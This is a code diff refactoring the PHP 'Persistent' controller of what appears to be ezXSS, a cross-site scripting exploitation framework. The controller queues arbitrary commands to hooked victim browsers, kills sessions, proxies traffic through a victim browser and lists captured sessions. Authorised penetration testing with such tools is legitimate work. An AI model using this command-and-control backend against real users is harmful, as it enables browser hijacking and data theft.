@@ -71,62 +71,66 @@ class Persistent extends Controller
 
         $session = $this->model('Session')->getByClientId($clientId, $origin);
 
-        if ($this->isPOST()) {
+        if (isPOST()) {
             try {
-                $this->validateCsrfToken();
-
-                $this->view->setContentType('application/json');
-
-                // Check if posted data is deleting session
-                if ($this->getPostValue('delete') !== null) {
-                    $this->model('Session')->deleteAll($clientId, $origin);
-                    redirect('/manage/persistent/all');
-                }
-
-                // Check if posted data is killing persistent
-                if ($this->getPostValue('kill') !== null) {
-                    $this->model('Console')->add($clientId, $origin, 'ez_stop()');
-                    throw new Exception('Kill commando send to session');
-                }
-
-                // Check if posted data is executing command
-                if ($this->getPostValue('execute') !== null) {
-                    $command = $this->getPostValue('command');
-                    $this->model('Console')->add($clientId, $origin, $command);
-                    return json_encode(1);
-                }
-
-                // Check if posted data is getting console data
-                if ($this->getPostValue('getconsole') !== null) {
-                    $console = $this->model('Session')->getAllConsole($clientId, $origin);
-                    return json_encode(['console' => $console]);
-                }
-
                 // Check if posted data is starting proxy
-                if ($this->getPostValue('proxy') !== null) {
-                    $ipport = $this->getPostValue('ipport');
+                if (_POST('proxy') !== null) {
+                    $this->validateCsrfToken();
+                    $ipport = _POST('ipport');
 
                     if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
                         throw new Exception('This does not look like a valid domain/IP with port');
                     }
 
-                    $passOrigin = $this->getPostValue('passorigin') !== null ? '1' : '0';
+                    $passOrigin = _POST('passorigin') !== null ? '1' : '0';
                     $this->model('Console')->add($clientId, $origin, "ez_soc('$ipport', $passOrigin)");
                     throw new Exception("Proxy started on $ipport is accessible on http://$clientId.ezxss" . ($passOrigin === '1' ? " and http://$origin" : ''));
+                } elseif (_POST('delete') !== null) {
+                    $this->validateCsrfToken();
+                    $this->model('Session')->deleteAll($clientId, $origin);
+                    redirect('/manage/persistent/all');
+                } elseif (_POST('kill') !== null) {
+                    $this->validateCsrfToken();
+                    $this->model('Console')->add($clientId, $origin, 'ez_stop()');
+                    throw new Exception('Persistent killed');
+                } else {
+                    $this->isAPIRequest();
+
+                    if (_JSON('delete') !== null) {
+                        $this->model('Session')->deleteAll($clientId, $origin);
+                        return jsonResponse('success', 1);
+                    }
+
+                    if (_JSON('kill') !== null) {
+                        $this->model('Console')->add($clientId, $origin, 'ez_stop()');
+                        return jsonResponse('success', 1);
+                    }
+
+                    if (_JSON('execute') !== null) {
+                        $command = _JSON('command');
+                        $this->model('Console')->add($clientId, $origin, $command);
+                        return jsonResponse('success', 1);
+                    }
+
+                    if (_JSON('getconsole') !== null) {
+                        $console = $this->model('Session')->getAllConsole($clientId, $origin);
+                        return jsonResponse('console', $console);
+                    }
                 }
 
             } catch (Exception $e) {
                 $this->view->setContentType('text/html');
                 $this->view->renderMessage($e->getMessage());
             }
+
         }
 
         // Render all rows
         $this->view->renderData('time', date('F j, Y, g:i a', $session['time']));
         $this->view->renderData('requests', $this->model('Session')->getRequestCount($clientId));
 
-        $session['browser'] = $this->parseUserAgent($session['user-agent']);
-        $session['last'] = $this->parseTimestamp($session['time'], 'long');
+        $session['browser'] = parseUserAgent($session['user-agent']);
+        $session['last'] = parseTimestamp($session['time'], 'long');
 
         $console = $this->model('Session')->getAllConsole($clientId, $origin);
         $this->view->renderData('console', $console);
@@ -163,8 +167,8 @@ class Persistent extends Controller
         $requests = $this->model('Session')->getAllByClientId($clientId, $origin);
 
         foreach ($requests as $key => $value) {
-            $requests[$key]['browser'] = $this->parseUserAgent($requests[$key]['user-agent']);
-            $requests[$key]['last'] = $this->parseTimestamp($requests[$key]['time'], 'long');
+            $requests[$key]['browser'] = parseUserAgent($requests[$key]['user-agent']);
+            $requests[$key]['last'] = parseTimestamp($requests[$key]['time'], 'long');
             $requests[$key]['shorturi'] = substr($requests[$key]['uri'], 0, 50);
         }
 
@@ -202,6 +206,62 @@ class Persistent extends Controller
         }
 
         return $this->showContent();
+    }
+
+    /**
+     * Renders the list of all sessions within payload and returns the content.
+     * 
+     * @return string
+     */
+    public function sessions()
+    {
+        $this->isAPIRequest();
+
+        $id = _JSON('id');
+
+        // Check payload permissions
+        $payloadList = $this->payloadList();
+        if (!is_numeric($id) || !in_array(+$id, $payloadList, true)) {
+            return jsonResponse('error', 'You dont have permissions to this payload');
+        }
+
+        // Checks if requested id is 'all'
+        if (+$id === 0) {
+            if ($this->isAdmin()) {
+                // Show all sessions
+                $sessions = $this->model('Session')->getAll();
+            } else {
+                // Show all sessions of allowed payloads
+                $sessions = [];
+                foreach ($payloadList as $payloadId) {
+                    if ($payloadId !== 0) {
+                        $payload = $this->model('Payload')->getById($payloadId);
+                        $payloadUri = '//' . $payload['payload'];
+                        if (strpos($payload['payload'], '/') === false) {
+                            $payloadUri .= '/%';
+                        }
+                        $sessions = array_merge($sessions, $this->model('Session')->getAllByPayload($payloadUri));
+                    }
+                }
+            }
+        } else {
+            // Show sessions of payload
+            $payload = $this->model('Payload')->getById($id);
+
+            $payloadUri = '//' . $payload['payload'];
+            if (strpos($payload['payload'], '/') === false) {
+                $payloadUri .= '/%';
+            }
+            $sessions = $this->model('Session')->getAllByPayload($payloadUri);
+        }
+
+        foreach ($sessions as $key => $value) {
+            $sessions[$key]['browser'] = parseUserAgent($sessions[$key]['user-agent']);
+            $sessions[$key]['last'] = parseTimestamp($sessions[$key]['time'], 'long');
+            $sessions[$key]['shorturi'] = substr($sessions[$key]['uri'], 0, 50);
+        }
+
+        return jsonResponse('data', $sessions);
     }
 
     /**
